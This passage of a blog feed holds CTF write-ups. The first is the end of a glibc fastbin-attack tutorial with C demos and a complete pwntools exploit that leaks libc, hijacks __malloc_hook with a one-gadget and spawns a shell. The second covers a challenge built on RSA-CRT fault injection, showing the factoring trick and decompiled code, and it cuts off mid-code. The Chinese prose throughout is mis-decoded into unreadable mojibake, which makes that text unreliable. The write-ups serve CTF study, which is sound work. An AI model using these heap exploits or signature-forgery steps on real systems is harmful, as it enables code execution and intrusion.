ç¬¬ä¸€æ¬¡åˆ†é…æ‹¿å› chunk1</span></span><br><span class="line">    chunk_a = <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// ç¬¬äºŒæ¬¡åˆ†é…è¿”å› stack_chunk çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>è¦åˆ©ç”¨Alloc to Stackè¿™ä¸ªæ¡ä»¶ï¼Œå¯¹åº”çš„å †çš„åœ°å€å¿…é¡»è¦æœ‰åˆæ³•çš„sizeï¼Œè¿™æ ·æ‰èƒ½å°†å †å†…å­˜åˆ†é…åˆ°æ ˆä¸­ï¼Œä»è€Œæ§åˆ¶æ ˆä¸­çš„ä»»æ„å†…å­˜åœ°å€ã€‚è€Œè¿™ä¸ªArbitraryAllocå’ŒAlloctoStackåŸºæœ¬ä¸Šå®Œå…¨ç›¸åŒï¼Œä½†æ˜¯æ§åˆ¶çš„å†…å­˜åœ°å€ä¸åœ¨ä»…ä»…å±€é™äºæ ˆï¼Œè€Œæ˜¯ä»»æ„çš„å†…å­˜åœ°å€ï¼Œæ¯”å¦‚è¯´bssã€heapã€dataã€stackç­‰ç­‰ã€‚</p><p>æ¨¡æ‹Ÿç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ†é…ä¸€ä¸ªå¤§å°ä¸º 0x60 çš„ chunk</span></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="comment">// é‡Šæ”¾ chunk1ï¼Œchunk1 è¢«æ”¾å…¥ fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="comment">// ä¿®æ”¹ chunk1 æŒ‡é’ˆçš„å†…å®¹ï¼Œä½¿å…¶æŒ‡å‘ç›®æ ‡åœ°å€ - 0x8</span></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1 = <span class="number">0x7ffff7dd1af5</span> - <span class="number">0x8</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// malloc ä¸¤æ¬¡ï¼šç¬¬ä¸€æ¬¡å–å‡º fastbin ä¸­çš„ chunkï¼ˆè¢«æˆ‘ä»¬ä¼ªé€ ï¼‰</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="comment">// ç¬¬äºŒæ¬¡ malloc è¿”å›ä¼ªé€ åœ°å€ï¼Œèµ‹å€¼ç»™ chunk_a</span></span><br><span class="line">    chunk_a = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250424181249963.png" alt="image-20250424181249963"></p><p>é”™ä½æ„é€ å‡ºä¸€ä¸ª0x00â€¦â€¦007fï¼Œè®¡ç®—å‡ºçš„chunkçš„å¤§å°ä¸º0x70ï¼ŒåŒ…å«0x10çš„chunk_headerï¼Œåˆ†é…0x60çš„å†…å®¹ã€‚</p><p>freeä¹‹åä¼ªé€ fdä¸º<code>0x7ffff7dd1af5 - 0x8</code>,2æ¬¡mallocåå‡ºç°çš„åœ°å€å°±ä¼šæ˜¯<code>0x7ffff7dd1af5 + 0x8</code>æ­¤æ—¶å †å†…å­˜å·²ç»åˆ†é…åˆ°äº†æ ˆä¸Šï¼Œå¹¶ä¸”å¯ä»¥ç»§ç»­å‘ä¸‹å»¶ä¼¸æ§åˆ¶æ ˆç©ºé—´ã€‚</p><h3 id="example-2"><a href="#example-2" class="headerlink" title="example"></a>example</h3><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250426211536407.png" alt="image-20250426211536407"></p><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>å¯¹ä¸»è¦çš„å‡½æ•°è¿›è¡Œåˆ†æï¼Œ</p><p>å¹¶ç®€å•ä¿®æ­£IDAåç¼–è¯‘ç»“æœ,çœ‹èµ·æ¥èˆ’æœå¤šäº†</p><p>ä¸»è¦å‡½æ•°ä¸ºAllocate,Fill,Free,Dump</p><p><img src="/2025/04/12/fastbin-attack%E7%B3%BB%E5%88%97/image-20250427153524182.png" alt="image-20250427153524182"></p><p>è¿™é‡Œè®©æˆ‘ä»¬é‡æ–°è¾“å…¥Sizeï¼Œä½†æ˜¯æ²¡æœ‰ä¿®æ”¹chunkçš„sizeåŸŸï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œä»»æ„å †æº¢å‡º</p><blockquote><p>æˆ‘ä»¬å¸Œæœ›ä½¿ç”¨unsortedbinæ¥æ³„æ¼libcåŸºåœ°å€ï¼Œæ‰€ä»¥å¿…é¡»è¦æœ‰chunkå¯ä»¥è¢«é“¾æ¥åˆ°unsorted binä¸­ï¼Œæ‰€ä»¥è¯¥chunkä¸èƒ½è¢«å›æ”¶åˆ° fastbin chunkï¼Œä¹Ÿä¸èƒ½å’Œ top chunkç›¸é‚»ã€‚å› ä¸ºåè€…åœ¨ä¸æ˜¯fastbinçš„æƒ…å†µä¸‹ï¼Œä¼šè¢«åˆå¹¶åˆ°top chunkä¸­ã€‚</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>å‚è€ƒexpå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#é¦–å…ˆæ˜¯å®šä¹‰çš„ä¸€äº›å‡½æ•°ï¼Œå¯¹åº”ç€ç¨‹åºçš„åŠŸèƒ½</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unsorted_offset_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#index0</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#index1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#index2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)<span class="comment">#index3</span></span><br><span class="line">alloc(<span class="number">0x80</span>)<span class="comment">#index4</span></span><br><span class="line"><span class="comment">#é¦–å…ˆç”³è¯·4ä¸ªfast chunkå’Œ1ä¸ªsmall chunk</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#free index1å’Œindex2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#fastbin[0]-&gt;index2-&gt;index1</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#æº¢å‡ºä¿®æ”¹index2çš„fdæŒ‡é’ˆä¸ºindex4çš„chunk header</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#fill index3ï¼Œä¿®æ”¹index4çš„å¤§å°ä¸º0x21ä½¿å…¶å¯ä»¥è¿›å…¥fastbin</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªæ˜¯index2ï¼Œç¬¬äºŒä¸ªä¼šåˆ†é…index4</span></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹index4çš„sizeä¸º0x91ï¼Œä½¿å…¶å¯ä»¥è¿›å…¥unsortedbin   </span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"><span class="comment">#é˜²æ­¢index4ä¸top chunkåˆå¹¶ï¼Œå…ˆç”³è¯·ä¸€ä¸ªï¼Œå†free4åˆ°unsortedbinä¸­</span></span><br><span class="line"><span class="comment">#å½“unsortedbinä¸­åªæœ‰ä¸€ä¸ªç©ºé—²çš„chunkæ—¶ï¼Œfdå’Œbkå‡æŒ‡å‘æœ¬èº«</span></span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#å½“small chunkè¢«é‡Šæ”¾æ—¶ï¼Œå®ƒçš„fdã€bkæŒ‡å‘ä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘top chunkåœ°å€ï¼Œè¿™ä¸ªæŒ‡é’ˆä¿å­˜åœ¨main_arenaçš„0x58åç§»å¤„</span></span><br><span class="line"><span class="comment">#è€Œmain_arenaæ˜¯libcçš„dataæ®µä¸­,åç§»ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œæ ¹æ®è¿™äº›å°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºåœ°å€äº†</span></span><br><span class="line"><span class="comment">#å½“small chunké‡Šæ”¾æ—¶ï¼Œèƒ½è¯»å‡ºfd æˆ–è€… bkçš„å€¼</span></span><br><span class="line"></span><br><span class="line">unsorted_addr=u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=unsorted_addr-<span class="number">0x3c3b20</span>-<span class="number">88</span><span class="comment">#88=unssorted_offset_arena(5)</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ§åˆ¶__malloc_hook</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#unsortedbinä¼šåˆ†è£‚æˆ2ä¸ªå †å—ï¼Œæœ‰ä¸€ä¸ªä»ç„¶åœ¨unsortedbinä¸­</span></span><br><span class="line"><span class="comment">#index2_contentçš„æŒ‡é’ˆä¾ç„¶æŒ‡å‘index4_chunk_data</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹index4çš„fdæŒ‡é’ˆ</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c3b20</span>-<span class="number">0x40</span>+<span class="number">0xd</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#åˆ†é…index4</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#åˆ†é…index7</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4525a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> å † </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPC_finalå‡ºé¢˜å°è®°ï¼ˆé€šè¿‡fmtè¿›è¡ŒRSA-CRT Fault Injectionï¼‰</title>
      <link href="/2025/04/08/NPC_final_crypwnto/"/>
      <url>/2025/04/08/NPC_final_crypwnto/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>æœ¬é¢˜æºç æ”¹è‡ªäº2022 Samsungçš„SecureRunner</p></blockquote><p>æœ¬é¢˜æ˜¯ä¸€é“<strong>äºŒè¿›åˆ¶åˆ†æ</strong>å’Œ<strong>å¯†ç å­¦</strong>ç›¸ç»“åˆçš„é¢˜ï¼Œç¬”è€…è®¤ä¸ºå‡ºè¿™ç§é¢˜è¿˜æ˜¯å¾ˆæœ‰è¶£çš„ã€‚</p><blockquote><p>æœ¬é¢˜æš‚å·²<strong>æ‰˜ç®¡</strong>è‡³è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦CTFç»ˆç«¯ä¾›å¤§å®¶<strong>ç»ƒä¹ å¤ç°</strong></p><p>é“¾æ¥ï¼š<a href="https://ctf.xidian.edu.cn/training/17?challenge=804">NPCÂ²CTF 2025 - è¥¿ç”µ CTF ç»ˆç«¯</a></p><p><strong>å…¶ä½™ç”¨é€”å‡éœ€é€šè¿‡ <a href="https://zechariah-0703.github.io/about/">å…³äºç¬”è€…</a> ä¸­çš„é‚®ç®±å¾å¾—ç¬”è€…åŒæ„</strong></p></blockquote><h2 id="é¢˜ç›®ç¼–å†™"><a href="#é¢˜ç›®ç¼–å†™" class="headerlink" title="é¢˜ç›®ç¼–å†™"></a>é¢˜ç›®ç¼–å†™</h2><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p>æºç ä¼šå¼€æºåˆ°æˆ‘çš„githubä»“åº“</p><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p>å°ç¦çš„å¤§è„‘é‡Œåªæœ‰ç­¾åæ­£ç¡®çš„å‘½ä»¤æ‰èƒ½æ‰§è¡Œï¼Œå¯å°ç¦ç¡ç€äº†ï¼ŒMortis å¤ª fw äº†ä¸çŸ¥é“ç§é’¥ã€‚</p><p>çœ‹æ¥åªèƒ½å’Œ Mortis æŠŠè„‘å†…å°å‰§åœºç ´åçš„ä¹±ä¸ƒå…«ç³Ÿæ‰èƒ½æ‹¿ flag äº†</p><p>ï¼ˆç®€å• Crypto + ç­¾åˆ° PWN = ä¹Ÿè®¸è¿˜è¡Œçš„å¤§ç²ª CRYpwnTOï¼‰ï¼ˆéœ€è¦ä¸€ç‚¹åŸºç¡€çš„äºŒè¿›åˆ¶åˆ†æèƒ½åŠ›ï¼‰</p><blockquote><p>ä¸ºäº†é™ä½éš¾åº¦ï¼ŒæŠŠè¿™é¢˜çš„å¯†ç è€ƒç‚¹<strong>ï¼ˆRSA-CRT Fault Injection</strong>ï¼‰å•ç‹¬ç¼–äº†ä¸€ä¸ªé¢˜ï¼ˆå³<strong>task.zipä¸­çš„just_a_hint.py</strong>ï¼‰ä½œä¸º<strong>æç¤º</strong></p></blockquote><h3 id="é¶æœºè¿æ¥"><a href="#é¶æœºè¿æ¥" class="headerlink" title="é¶æœºè¿æ¥"></a>é¶æœºè¿æ¥</h3><p><img src="/2025/04/08/NPC_final_crypwnto/Pasted image 20250410155637.png" alt="Pasted image 20250410155637"></p><p>è¿ä¸Šé¶æœºå<strong>å¿½ç•¥</strong>æ²¡ä»€ä¹ˆç”¨çš„<strong>å‰§æƒ…</strong>ï¼Œç»“åˆæ–‡å­—ä¿¡æ¯å’Œå¯¹å„ç§é€‰é¡¹çš„å°è¯•ï¼Œå¯ä»¥æç‚¼å‡ºä»¥ä¸‹è¦ç‚¹</p><ul><li>é€‰é¡¹<strong>1</strong>å¯ä»¥è·å–RSAå…¬é’¥</li><li>é€‰é¡¹<strong>2</strong>å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†åŒæ—¶éœ€è¦è¾“å…¥å‘½ä»¤å’Œè¿™æ¡å‘½ä»¤æ­£ç¡®çš„signature</li><li><strong>é€‰é¡¹ 3</strong> ç»™äº†ä¸€äº› hint<ul><li><strong>RSA</strong> ç®—æ³•ä½¿ç”¨äº† <strong>CRT</strong> å¯¹è®¡ç®—è¿›è¡Œäº†åŠ é€Ÿ</li><li>Mortis ä¼šç»™ä¸€äº›å¸®åŠ©ï¼ˆå¯¹åº”åªèƒ½ç”¨ 1 æ¬¡çš„é€‰é¡¹ <strong>114</strong>ï¼‰ï¼ˆå½©è›‹ï¼š1 æœˆ 14 æ—¥æ˜¯ç¦å­ç±³çš„ç”Ÿæ—¥å“¦ï¼‰</li><li>æœ‰ä»€ä¹ˆä¸œè¥¿è—èµ·æ¥äº†ï¼ˆIDA æ‰“å¼€ä¼šå‘ç°ä¸€ä¸ªéšè—çš„å‡½æ•° <code>yada</code>ï¼Œé€‰é¡¹ <strong>9999</strong>ï¼‰</li></ul></li><li>é€‰é¡¹<strong>114</strong>å¯ä»¥è®©Mortisæä¾›2æ¡æŒ‡ä»¤ä¸­ä»»æ„1æ¡ç­¾åï¼Œä½†ç¨‹åºæ¯æ¬¡è¿è¡Œåªèƒ½é€‰1æ¬¡114</li></ul><p>æ€»ç»“æœ¬é¢˜æ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå™¨ï¼Œä½†æ˜¯æ¯æ¡æŒ‡ä»¤éƒ½éœ€è¦ç”¨ç§é’¥æ­£ç¡®ç­¾åæ‰èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‹¿åˆ°ç§é’¥ï¼Œå½’æ ¹ç»“åº•æ˜¯è¦æˆåŠŸåˆ†è§£Nã€‚</p><h3 id="åˆ†æ-just-a-hint-py"><a href="#åˆ†æ-just-a-hint-py" class="headerlink" title="åˆ†æ just_a_hint.py"></a>åˆ†æ just_a_hint.py</h3><p>æ ¸å¿ƒæ˜¯<code>hintGenerate</code>å‡½æ•°ï¼Œæ¨¡ä»¿äº†RSA-CRT Fault Injectionçš„è¿‡ç¨‹ï¼ˆå³ä½¿ï¼‰ç”Ÿæˆäº†ä¸€ä¸ªhint</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hintGenetare</span>(<span class="params">p,q,d</span>):</span><br><span class="line">m=bytes_to_long(<span class="string">b&quot;Just a hint&quot;</span>)</span><br><span class="line">q= q ^ (<span class="number">0xff</span> &lt;&lt; randint(<span class="number">1</span>, <span class="number">128</span>))</span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line">dq = d % (q - <span class="number">1</span>)</span><br><span class="line">sp = <span class="built_in">pow</span>(m, dp, p)</span><br><span class="line">sq = <span class="built_in">pow</span>(m, dq, q)</span><br><span class="line">a = q * <span class="built_in">pow</span>(q, -<span class="number">1</span>, p)</span><br><span class="line">b = p * <span class="built_in">pow</span>(p, -<span class="number">1</span>, q)</span><br><span class="line">hint = (a*sp +b*sq)% n</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hint</span><br></pre></td></tr></table></figure><p>è§£å†³æœ¬é¢˜çš„å…³é”®ä»£ç å®é™…ä¸Šå°±ä¸€è¡Œï¼Œ<code>p = GCD(pow(hint, e) - m, n)</code><br>å…·ä½“åŸç†å¤§å®¶ç›´æ¥æœç´¢<strong>RSA-CRT Fault Injection</strong>å³å¯ï¼Œä¸‹å›¾æ˜¯æˆ‘<strong>èƒ¡ä¹±</strong>è°·æ­Œå‡ºæ¥çš„ä¸€ç¯‡è®ºæ–‡â¬‡ï¸<img src="/2025/04/08/NPC_final_crypwnto/Pasted image 20250410221039.png" alt="Pasted image 20250410221039"></p><p>ç”¨ CRT åŠ é€Ÿ RSA è®¡ç®—çš„è¯ï¼Œå¦‚æœè¿‡ç¨‹ä¸­å‡ºç°ä¸Šé¢è®ºæ–‡å›¾ä¸­æ‰€è¿°é”™è¯¯ï¼Œå¾—åˆ°ä¸€ä¸ªé”™è¯¯çš„ç­¾å <code>s</code> æˆ‘ä»¬å°±å¯ä»¥å¦‚ä¸Šå›¾æ‰€ç¤º <code>p = GCD(pow(s, e) - m, n)</code> åˆ†è§£ nï¼Œç®—å‡ºç§é’¥ï¼Œè¿›è€Œä¼ªé€  signatureã€‚</p><blockquote><p>å¦‚æœæ˜¯ä¼ ç»Ÿé™„ä»¶å¯†ç é¢˜çš„è¯ï¼Œæˆ‘åº”è¯¥ç”¨ä¸€ä¸ªå‡½æ•°æ¨¡æ‹Ÿè®¡ç®—å‡ºé”™ï¼Œç®—å‡ºä¸€ä¸ªæ•°å­—ï¼ˆ<code>hint=â€¦â€¦</code>ï¼‰ï¼Œç„¶åç›´ print ç»™ä½ ï¼Œä½ å†ç®—å‡ºç§é’¥ã€‚ä½†æ˜¯è¿™æ ·å°±å®Œå…¨æ²¡æœ‰â€œæ•…éšœæ³¨å…¥â€çš„æ„Ÿè§‰äº†ï¼Œç”¨ Pwn çš„æ‰‹æ®µæ¥å®ç°çš„è¯ï¼Œæ²¡æœ‰ hint å°±è‡ªå·±åˆ›é€  hintï¼Œæ›´è´´è¿‘å®æˆ˜çš„æ„Ÿè§‰ã€‚</p></blockquote><p>è‡³æ­¤ï¼ŒæˆåŠŸåˆ†è§£$p,q$ï¼Œè§£å¯†msgå·²ç»æ˜¯è½»è½»æ¾æ¾ï¼Œä½†æ³¨é‡Šä¹Ÿè¯´äº†è¿™åªæ˜¯ä¸€ä¸ªhintï¼Œå’Œç­”æ¡ˆæ²¡ä»€ä¹ˆå…³ç³»ï¼Œ<strong>åªæ˜¯ç»™é¢˜ç›®ä¸»ä½“æŒ‡æ˜è§£é¢˜æ–¹å‘</strong></p><p>æ ¹æ®é€‰é¡¹ <strong>3</strong> æä¾›çš„hintï¼Œç¨‹åºä¹Ÿä½¿ç”¨äº† <strong>RSA-CRT</strong>ï¼Œå¦‚æœæˆ‘ä»¬å¯¹ç¨‹åºä¸­çš„RSAå‚æ•°ä¹Ÿè¿›è¡ŒFault Injectionï¼Œé‚£å°±èƒ½åˆ†è§£på’Œqï¼Œé‚£æ‹¿ç§é’¥å°±å¯ä»¥è¯´æ˜¯ä¿¡æ‰‹æ‹ˆæ¥äº†ï¼Œè¿›è€Œä¼ªé€ å°ç¦ç­¾åçš„ signature æ‰§è¡Œä»»æ„å‘½ä»¤</p><h3 id="åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶"></a>åˆ†æäºŒè¿›åˆ¶æ–‡ä»¶</h3><p>æœ¬é¢˜mainå‡½æ•°é€šè¿‡IDAåç¼–è¯‘åå¯ä»¥è¯´æ˜¯é€»è¾‘ç›¸å½“æ¸…æ™°</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n9; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  _BYTE v7[<span class="number">168</span>]; <span class="comment">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">initRSA</span>(v7);</span><br><span class="line">  heap = (__int64)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">generateKey</span>(v7);</span><br><span class="line">  <span class="built_in">welcome</span>();</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    n9 = <span class="built_in">menu</span>();</span><br><span class="line">    <span class="keyword">if</span> ( n9 == <span class="number">9999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">yada</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( n9 &lt;= <span class="number">9999</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n9 == <span class="number">114</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="built_in">MortisHelp</span>(v5);</span><br><span class="line">          <span class="built_in">generateSign</span>((&amp;cmds)[v5], v7);</span><br><span class="line">          ++v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;get the hell out of here , Mortis!!!&quot;</span>);</span><br><span class="line">          n9 = <span class="number">9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( n9 &lt;= <span class="number">114</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n9 == 